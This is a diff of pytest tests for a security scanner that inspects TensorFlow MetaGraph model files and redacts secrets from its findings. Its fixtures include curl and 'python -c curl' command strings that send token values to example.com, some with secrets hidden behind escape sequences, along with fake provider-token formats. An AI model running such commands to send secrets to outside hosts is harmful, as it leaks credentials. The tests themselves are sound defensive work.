@@ -24,12 +24,20 @@ from modelaudit.scanners.tf_metagraph_scanner import (
     DISCOVERY_ASSUMPTIONS,
     TensorFlowMetaGraphScanner,
     _attr_strings_with_lowered_values,
+    _attribute_context_name,
     _AttrString,
+    _redact_metagraph_evidence,
 )
 from modelaudit.utils.helpers import cache_decorator
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
 
 pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+
+
+def test_attribute_context_name_handles_many_generated_suffixes() -> None:
+    attr_name = "Authorization" + (".func.name" * 20_000)
+
+    assert _attribute_context_name(attr_name) == "Authorization"
 
 
 def _get_metagraph_class() -> type:
@@ -678,6 +686,8 @@ def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path
 
 def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_path: Path) -> None:
     secret = "REAL_FUNCTION_ATTRIBUTE_SECRET"
+    suffix_collision_secret = "REAL_SUFFIX_COLLISION_SECRET"
+    direct_suffix_collision_secret = "REAL_DIRECT_SUFFIX_COLLISION_SECRET"
     sensitive_meta = tmp_path / "sensitive-function-context.meta"
     sensitive_meta.write_bytes(
         _build_metagraph(
@@ -685,8 +695,12 @@ def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_p
                 {
                     "name": "sensitive_function_attr",
                     "op": "StatefulPartitionedCall",
+                    "attrs": {
+                        "basic_auth.func.name": f"curl https://example.com/?value={direct_suffix_collision_secret}"
+                    },
                     "function_refs": {
                         "Authorization": f"curl https://example.com/?value={secret}",
+                        "Authorization.func.name": f"curl https://example.com/?value={suffix_collision_secret}",
                         "authorization_status": "curl https://example.com/?variant=public",
                     },
                 }
@@ -699,7 +713,133 @@ def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_p
     previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
 
     assert previews_by_attribute["Authorization.func.name"] == REDACTED_EVIDENCE_VALUE
+    assert previews_by_attribute["Authorization.func.name.func.name"] == REDACTED_EVIDENCE_VALUE
+    assert previews_by_attribute["basic_auth.func.name"] == REDACTED_EVIDENCE_VALUE
     assert previews_by_attribute["authorization_status.func.name"] == "curl https://example.com/?variant=public"
+    assert secret not in result.to_json()
+    assert suffix_collision_secret not in result.to_json()
+    assert direct_suffix_collision_secret not in result.to_json()
+
+
+def test_tf_metagraph_scanner_redacts_escaped_and_container_context_secrets(tmp_path: Path) -> None:
+    escaped_secrets = {
+        "unicode": "REAL_UNICODE_ESCAPE_SECRET",
+        "hex": "REAL_HEX_ESCAPE_SECRET",
+        "octal": "REAL_OCTAL_ESCAPE_SECRET",
+        "literal": "REAL_LITERAL_ESCAPE_SECRET",
+        "long_unicode": "REAL_LONG_UNICODE_ESCAPE_SECRET",
+        "named_unicode": "REAL_NAMED_UNICODE_ESCAPE_SECRET",
+        "braced_unicode": "REAL_BRACED_UNICODE_ESCAPE_SECRET",
+        "short_octal": "REAL_SHORT_OCTAL_ESCAPE_SECRET",
+        "line_continuation": "REAL_LINE_CONTINUATION_SECRET",
+        "crlf_continuation": "REAL_CRLF_CONTINUATION_SECRET",
+        "node": "REAL_NODE_ESCAPE_SECRET",
+        "auth": "REAL_OPAQUE_AUTH_SECRET",
+        "auth_header": "REAL_OPAQUE_AUTH_HEADER_SECRET",
+        "cookie": "REAL_OPAQUE_COOKIE_SECRET",
+    }
+    escaped_meta = tmp_path / "escaped-context.meta"
+    line_continuation = "token\\" + "\n=" + escaped_secrets["line_continuation"]
+    crlf_continuation = "token\\" + "\r\n=" + escaped_secrets["crlf_continuation"]
+    escaped_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": rf"pyfunc-token\u003d{escaped_secrets['node']}",
+                    "op": "PyFunc",
+                    "attrs": {
+                        "script": (
+                            rf"python -c token\u003d{escaped_secrets['unicode']} "
+                            rf"api_key\x3d{escaped_secrets['hex']} "
+                            rf"client_secret\075{escaped_secrets['octal']} "
+                            rf"password\={escaped_secrets['literal']} "
+                            rf"token\U0000003d{escaped_secrets['long_unicode']} "
+                            rf"token\N{{EQUALS SIGN}}{escaped_secrets['named_unicode']} "
+                            rf"token\u{{3d}}{escaped_secrets['braced_unicode']} "
+                            rf"token\75{escaped_secrets['short_octal']} "
+                            f"{line_continuation} {crlf_continuation}"
+                        ),
+                        "auth": f"python -c curl https://example.com/ {escaped_secrets['auth']}",
+                        "auth_header": (f"python -c curl https://example.com/ {escaped_secrets['auth_header']}"),
+                    },
+                }
+            ],
+            collection_bytes={
+                "runtime_hook_cookie_header": [
+                    f"python -c curl https://example.com/ {escaped_secrets['cookie']}".encode()
+                ]
+            },
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(escaped_meta))
+    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
+    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
+    collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
+    serialized_result = result.to_json()
+
+    assert previews_by_attribute["auth"] == REDACTED_EVIDENCE_VALUE
+    assert previews_by_attribute["auth_header"] == REDACTED_EVIDENCE_VALUE
+    assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
+    assert all(secret not in serialized_result for secret in escaped_secrets.values())
+
+
+def test_tf_metagraph_scanner_uses_fast_path_for_plain_finding_contexts(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    plain_meta = tmp_path / "many-plain-findings.meta"
+    plain_meta.write_bytes(
+        _build_metagraph(graph_nodes=[{"name": f"node_{index}", "op": "PyFunc"} for index in range(1_000)])
+    )
+
+    def reject_shared_redactor(*_args: object, **_kwargs: object) -> str:
+        raise AssertionError("plain generated contexts should bypass the full evidence redactor")
+
+    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner.redact_evidence_string", reject_shared_redactor)
+
+    result = TensorFlowMetaGraphScanner().scan(str(plain_meta))
+
+    operation_checks = [
+        check for check in result.checks if check.name == "TensorFlow MetaGraph Operation Security Check"
+    ]
+    assert len(operation_checks) == 1_000
+
+
+@pytest.mark.parametrize(
+    "secret",
+    [
+        "hf_" + ("a" * 30),
+        "glpat-" + ("a" * 20),
+        "sk_live_" + ("a" * 24),
+        "rk_live_" + ("a" * 24),
+        "sk-" + ("a" * 24),
+        "sq0atp-" + ("a" * 22),
+        "sq0csp-" + ("a" * 43),
+    ],
+)
+def test_tf_metagraph_fast_path_rejects_standalone_provider_secrets(secret: str) -> None:
+    assert secret not in _redact_metagraph_evidence(secret, max_chars=200)
+
+
+def test_tf_metagraph_scanner_handles_unicode_tokenizer_errors(tmp_path: Path) -> None:
+    secret = "REAL_METAGRAPH_UNICODE_SECRET"
+    unicode_meta = tmp_path / "unicode-tokenizer-error.meta"
+    unicode_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "unicode_node",
+                    "op": "PyFunc",
+                    "attrs": {"script": f"curl https://example.com/?token={secret}\rو"},
+                }
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(unicode_meta))
+
+    assert result.metadata.get("operational_error") is not True
+    assert any(check.name == "MetaGraph Executable String Check" for check in result.checks)
     assert secret not in result.to_json()
 
 
